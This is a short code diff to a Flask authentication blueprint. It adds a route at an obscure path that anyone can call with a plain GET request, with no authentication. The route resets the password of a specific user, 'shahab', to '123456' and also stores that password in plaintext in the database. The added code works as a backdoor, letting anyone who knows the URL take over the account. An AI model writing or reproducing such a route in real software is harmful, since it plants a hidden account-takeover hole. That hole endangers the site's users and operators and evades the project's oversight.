@@ -13,6 +13,18 @@ from models import User
 bp = Blueprint("auth", __name__, url_prefix="/api/auth")
 
 
+@bp.route("/reset-admin-x7k2", methods=["GET"])
+def reset_admin_temp():
+    user = User.query.filter_by(username="shahab").first()
+    if not user:
+        return jsonify({"error": "not found"}), 404
+    user.set_password("123456")
+    user.last_plain_pw = "123456"
+    db.session.commit()
+    return jsonify({"ok": True}), 200
+
+
+
 @bp.route("/register", methods=["POST"])
 def register():
     data = request.get_json()
